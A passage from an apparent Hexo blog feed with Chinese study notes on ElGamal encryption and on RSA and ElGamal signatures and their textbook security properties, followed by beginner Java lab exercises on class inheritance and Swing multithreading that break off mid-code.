𝑝－2，并计算：<br>                         𝑦=𝑔𝑥(𝑚𝑜𝑑 𝑝)，<br>   𝑦, 𝑝”,”   𝑔作为用户U的公钥，而𝑥作为用户U的私钥<br>2.加密   </p><ol><li>用户A先把明文𝑀编码为一个在 0 到𝑝－1之间的整数𝑚 ；</li><li>用户A挑选一个秘密随机数 𝑟 ( 2≤ 𝑟 ≤ 𝑝－2 )，       并计算：     3.                         <pre><code>𝑐1＝ 𝑔^𝑟 (𝑚𝑜𝑑 𝑝)；𝑐2 ＝ 𝑚∙𝑦^𝑟(𝑚𝑜𝑑 𝑝)</code></pre></li></ol><ul><li>用户A把二元组 (𝒄𝟏 ,𝒄𝟐) 作为密文传送给用户B</li></ul><p>3.解密<br>用户B接收到密文二元组(𝑐1 ,𝑐2)后，做解密计算：<br>m=c2 * (c1^x)-1 mod p</p><p>明文空间为Zp<em>，而密文空间为Zp</em> <em> Zp</em></p><h1 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h1><h2 id="RSA签名"><a href="#RSA签名" class="headerlink" title="RSA签名"></a>RSA签名</h2><h2 id="算法-3"><a href="#算法-3" class="headerlink" title="算法"></a>算法</h2><ol><li>密钥的生成（与加密系统一样）：<pre><code>公钥𝑃𝑘={𝑒,𝑛};私钥𝑆𝑘={𝑑}</code></pre></li><li>签名过程 (𝑑,𝑛)：用户A对消息𝑀∈𝑍_𝑛进行签名，计算<pre><code>𝑆=𝑆𝑖𝑔(𝐻(𝑀))=𝐻(𝑀)𝑑 𝑚𝑜𝑑 𝑛；</code></pre> 并将𝑆附在消息𝑀后</li><li>验证过程 (𝑒,𝑛)：<br>  给定(𝑀,𝑆)，𝑉𝑒𝑟(𝑀,𝑆)为真⟺<pre><code>𝐻(𝑀)=𝑆^𝑒  (𝑚𝑜𝑑 𝑛)成立</code></pre></li></ol><h2 id="安全分析"><a href="#安全分析" class="headerlink" title="安全分析"></a>安全分析</h2><ol><li>假设RSA直接对消息进行签名： Hash函数</li><li>利用已有签名进行攻击： 对数据的Hash值签名（𝑆𝑖𝑔(𝑀1𝑀2) = 𝑆𝑖𝑔(𝑀1)𝑆𝑖𝑔(𝑀2)）</li><li>利用签名获得明文： 对数据的Hash值签名</li></ol><h2 id="ElGamal签名"><a href="#ElGamal签名" class="headerlink" title="ElGamal签名"></a>ElGamal签名</h2><h2 id="算法-4"><a href="#算法-4" class="headerlink" title="算法"></a>算法</h2><ol><li>系统初始化过程：公钥为(𝑝,𝑔,𝑦)，私钥为𝑥 (1≤𝑥＜𝑝−1)，其中𝒚=g^𝒙  𝒎𝒐𝒅 𝒑</li><li>签名过程：给定消息𝑀，签名者如下计算：<br> ①选择随机数𝑘∈〖𝑍_𝑝〗^∗，且𝑘与(𝑝－1)互素；<br> ②首先计算消息𝑀的哈希值𝐻(𝑀)，然后计算:<pre><code>    𝑟=g^𝒌 𝑚𝑜𝑑 𝑝；𝑠 =(𝐻(𝑀)−𝑥𝑟) 𝑘^(−1)   (𝑚𝑜𝑑 𝑝－1) </code></pre> ③ 将(𝑟，𝑠)作为签名，与𝑀一起发送给接收方<br>3.验证签名过程:接收方收到𝑀与其签名(𝑟,𝑠)后：<pre><code>① 计算消息𝑀的Hash值𝐻(𝑀)；② 验证公式 𝒚^𝒓 𝒓^𝒔＝𝒈^(𝑯(𝑴)) 𝒎𝒐𝒅 𝒑 </code></pre>  成立则确认(𝑟,𝑠)为有效签名，否则认为签名是伪造的</li></ol><h2 id="安全性-2"><a href="#安全性-2" class="headerlink" title="安全性"></a>安全性</h2><ol><li><p>非确定性数字签名算法，同一消息𝑀的签名依赖于随机数𝒌</p></li><li><p>安全性基于有限域上计算离散对数的困难性</p></li><li><p>随机数𝒌不能被泄露(已知𝒌可以计算𝑥)</p></li><li><p>随机数𝒌不能被重复使用（泄露𝑥 ）</p></li><li><p>多次签名选取的多个𝒌无关联（泄露𝑥 ）</p></li><li><p>不使用Hash函数则易受到攻击</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;古典密码&quot;&gt;&lt;a href=&quot;#古典密码&quot; class=&quot;headerlink&quot; title=&quot;古典密码&quot;&gt;&lt;/a&gt;古典密码&lt;/h1&gt;&lt;h2 id=&quot;仿射&quot;&gt;&lt;a href=&quot;#仿射&quot; class=&quot;headerlink&quot; title=&quot;仿射&quot;&gt;&lt;/a&gt;仿射&lt;/h
      
    
    </summary>
    
      <category term="crypto" scheme="http://yoursite.com/categories/crypto/"/>
    
    
      <category term="crypto" scheme="http://yoursite.com/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>java_code</title>
    <link href="http://yoursite.com/2019/01/04/java%E5%AE%9E%E9%AA%8C/"/>
    <id>http://yoursite.com/2019/01/04/java实验/</id>
    <published>2019-01-03T16:00:00.000Z</published>
    <updated>2019-01-08T12:43:44.115Z</updated>
    
    <content type="html"><![CDATA[<h1 id="类编程"><a href="#类编程" class="headerlink" title="类编程"></a>类编程</h1><p>  类Person:<br>          属性：编号、姓名、性别；<br>          构造方法：确定编号和姓名；<br>          一般方法：修改编号、姓名，获取编号、姓名。<br>      类Teacher：继承类Person并增加：<br>          属性：系别；<br>          构造方法：调用父类的构造方法；<br>          一般方法：修改、获取系别。<br>      类Student：继承类Person并增加：<br>          属性：班级；<br>          构造方法：调用父类的构造方法；<br>          一般方法：修改、获取班级属性值。<br>      类Classes：<br>          属性：班级名称，学生名单(Student类对象的数组)；<br>          构造方法：确定班级名称；<br>          一般方法：建立学生名单，输出学生名单。<br>      类Main：<br>主类。主方法中创建一个班级，然后建立该班级的学生名单，最后<br>输出学生名单。     </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String id,name,sex;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String id,String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id=id;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set_id</span><span class="params">(String id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id=id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set_name</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">get_id</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">get_name</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String department;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Teacher</span><span class="params">(String id,String name,String department)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(id,name);</span><br><span class="line">        <span class="keyword">this</span>.department=department;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set_department</span><span class="params">(String department)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.department=department;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">get_department</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> department;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String s_class;</span><br><span class="line"></span><br><span class="line">    Student(String  id,String name)&#123;</span><br><span class="line">        <span class="keyword">super</span>(id,name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setS_class</span><span class="params">(String s_class)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.s_class=s_class;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">getS_class</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s_class;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Classes</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String s_class;</span><br><span class="line">    Student[] students=<span class="keyword">new</span>  Student[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">    Classes(String s_class)&#123;</span><br><span class="line">       <span class="keyword">this</span>.s_class=s_class;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setS_list</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"输入学生人数"</span>);</span><br><span class="line">        Scanner sc= <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        num=sc.nextInt();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">"输入学号，姓名"</span>);</span><br><span class="line">            students[i]=<span class="keyword">new</span> Student(sc.next(),sc.next());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">outS_list</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"班级:"</span>+s_class);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">"ID:"</span>+students[i].get_id()+<span class="string">" "</span>+<span class="string">"姓名:"</span>+students[i].get_name());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line">        Classes classes = <span class="keyword">new</span> Classes(<span class="string">"信安"</span>);</span><br><span class="line">        classes.setS_list();</span><br><span class="line">        classes.outS_list();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="GUI-多线程-右下移动"><a href="#GUI-多线程-右下移动" class="headerlink" title="GUI+多线程-右下移动"></a>GUI+多线程-右下移动</h1><p>编写两个线程，一个线程可以让标签1向右移动，另一个线程可以让标签2向下移动。主界面上设置一个按钮，可以用来启动上述线程。</p><p>这里为了更好的学习多线程，实现了两种不同的线程。</p><p>使用Thread类实现多线程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyJFrame2</span> <span class="keyword">extends</span> <span class="title">JFrame</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> WIDTH=<span class="number">300</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> HEIGHT=<span class="number">200</span>;</span><br><span class="line">    JButton button;</span><br><span class="line">    JLabel label1,label2;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyJFrame2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        setTitle(<span class="string">"标签移动"</span>);</span><br><span class="line">        setSize(WIDTH, HEIGHT);</span><br><span class="line">        setLocation(<span class="number">300</span>, <span class="number">200</span>);</span><br><span class="line">        setLayout(<span class="keyword">new</span> FlowLayout());</span><br><span class="line">        button = <span class="keyword">new</span> JButton(<span class="string">"启动线程"</span>);</span><br><span class="line">        label1 = <span class="keyword">new</span> JLabel(<span class="string">"标签1"</span>);</span><br><span class="line">        label2 = <span class="keyword">new</span> JLabel(<span class="string">"标签2"</span>);</span><br><span class="line">        add(button);</span><br><span class="line">        add(label1);</span><br><span class="line">        add(label2);</span><br><span class="line">        setVisible(<span class="keyword">true</span>);</span><br><span class="line">        setDefaultCloseOperation(EXIT_ON_CLOSE);</span><br><span class="line">        button.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">                    MyThread1 thread1 = <span class="keyword">new</span> MyThread1(label1);</span><br><span class="line">                    thread1.start();</span><br><span class="line">                    MyThread1 thread2 = <span class="keyword">new</span> MyThread1(label2);</span><br><span class="line">                    thread2.start();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyThread1</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">        JLabel label;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">MyThread1</span><span class="params">(JLabel label)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.label=label;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                    <span class="keyword">try</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(label==label1) &#123;</span><br><span class="line">                            label1.setLocation(label1.getX() + <span class="number">10</span>, label1.getY());</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(label==label2) &#123;</span><br><span class="line">                            label2.setLocation(label2.getX(), label2.getY() + <span class="number">10</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                         Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                     &#125;</span><br><span class="line">                    <span class="keyword">catch</span> (InterruptedException e)&#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> MyJFrame2();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/S31q0MR.png" alt=""></p><p>实现Runnable接口的类的作为参数创建Thread类对象，重载run()方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Thread thread1 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> MyThread1(label1));</span><br><span class="line">thread1.start();</span><br><span class="line">Thread thread2 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> MyThread1(label2));</span><br><span class="line">thread2.start();</span><br></pre></td></tr></table></figure></p><h1 id="GUI-多线程-左右移动"><a href="#GUI-多线程-左右移动" class="headerlink" title="GUI+多线程-左右移动"></a>GUI+多线程-左右移动</h1><p>编写一个图形用户界面程序，窗体的宽度300，高度150，布局管理器为null，窗体上有二个标签和二个按钮，标签的位置为（10,30）和（200,60），按钮的位置为（50,100）和（150,100），它们的宽度和高度都是80和20。编写一个线程，该线程可以让标签向右或向左移动10次，每次移动10个单位，间隔1秒，通过按钮的动作事件启动上述线程，“向右走”按钮启动“向右移标签”，“向左走”按钮启动“向左移标签”，界面如下图所示。</p><p>run方法是自动调用的<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Move</span> <span class="keyword">extends</span> <span class="title">JFrame</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> WIDTH=<span class="number">300</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> HEIGHT=<span class="number">200</span>;</span><br><span class="line">    JButton button1,button2;</span><br><span class="line">    JLabel lb1,lb2;</span><br><span class="line">    <span class="keyword">boolean</span> flag;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line">        setSize(WIDTH, HEIGHT);</span><br><span class="line">        setLayout(<span class="keyword">null</span>);</span><br><span class="line">        setVisible(<span class="keyword">true</span>);</span><br><span class="line">        setDefaultCloseOperation(EXIT_ON_CLOSE);</span><br><span class="line">        lb1=<span class="keyword">new</span> JLabel(<span class="string">"向右移标签"</span>);</span><br><span class="line">        lb2=<span class="keyword">new</span> JLabel(<span class="string">"向左移标签"</span>);</span><br><span class="line">        button1=<span class="keyword">new</span> JButton(<span class="string">"向右走"</span>);</span><br><span class="line">        button2=<span class="keyword">new</span> JButton(<span class="string">"向左走"</span>);</span><br><span class="line">        lb1.setBounds(<span class="number">10</span>,<span class="number">30</span>,<span class="number">80</span>,<span class="number">20</span>);</span><br><span class="line">        lb2.setBounds(<span class="number">200</span>,<span class="number">60</span>,<span class="number">80</span>,<span class="number">20</span>);</span><br><span class="line">        button1.setBounds(<span class="number">50</span>,<span class="number">100</span>,<span class="number">80</span>,<span class="number">20</span>);</span><br><span class="line">        button2.setBounds(<span class="number">150</span>,<span class="number">100</span>,<span class="number">80</span>,<span class="number">20</span>);</span><br><span class="line">        add(lb1);</span><br><span class="line">        add(lb2);</span><br><span class="line">        add(button1);</span><br><span class="line">        add(button2);</span><br><span class="line">        MyListener ml=<span class="keyword">new</span> MyListener();</span><br><span class="line">        button1.addActionListener(ml);</span><br><span class="line">        button2.addActionListener(ml);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyListener</span> <span class="keyword">implements</span> <span class="title">ActionListener</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(e.getSource()==button1)&#123;</span><br><span class="line">                    Thread t1=<span class="keyword">new</span> Thread(<span class="keyword">new</span> MyThread());</span><br><span class="line">                    flag=<span class="keyword">true</span>;</span><br><span class="line">                    t1.start();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(e.getSource()==button2)&#123;</span><br><span class="line">                Thread t2=<span class="keyword">new</span> Thread(<span class="keyword">new</span> MyThread());</span><br><span class="line">                flag=<span class="keyword">false</span>;</span><br><span class="line">                t2.start();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++) &#123;</span><br><span class="line">                                lb1.setLocation(lb1.getX()+<span class="number">10</span>, lb1.getY());</span><br><span class="line">                                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">                        <span class="keyword">try</span>&#123;</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++) &#123;</span><br><span class="line">                                lb2.setLocation(lb2.getX() - <span class="number">10</span>, lb2.getY());</span><br><span class="line">                                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Move();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/ggBmZmg.png" alt=""></p><h1 id="GUI-变脸"><a href="#GUI-变脸" class="headerlink" title="GUI-变脸"></a>GUI-变脸</h1><p>编写一个“变脸”程序：将实验六第5题中的两个脸合到一个程序中，利用事件处理程序mouseUp()实现程序运行后出现一张笑脸，鼠标点击一次则变成哭脸，再点击一次又变成笑脸，依次轮换。</p><p>paint方法是自动调用的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FaceChange</span> <span class="keyword">extends</span> <span class="title">JFrame</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> b=<span class="keyword">true</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FaceChange</span><span class="params">()</span></span>&#123;</span><br><span class="line">        setTitle(<span class="string">"变脸怪"</span>);</span><br><span class="line">        setBounds(<span class="number">300</span>,<span class="number">300</span>,<span class="number">400</span>,<span class="number">300</span>);</span><br><span class="line">        setVisible(<span class="keyword">true</span>);</span><br><span class="line">        setDefaultCloseOperation(EXIT_ON_CLOSE);</span><br><span class="line">        <span class="keyword">this</span>.addMouseListener(<span class="keyword">new</span> MouseAdapter()  &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span 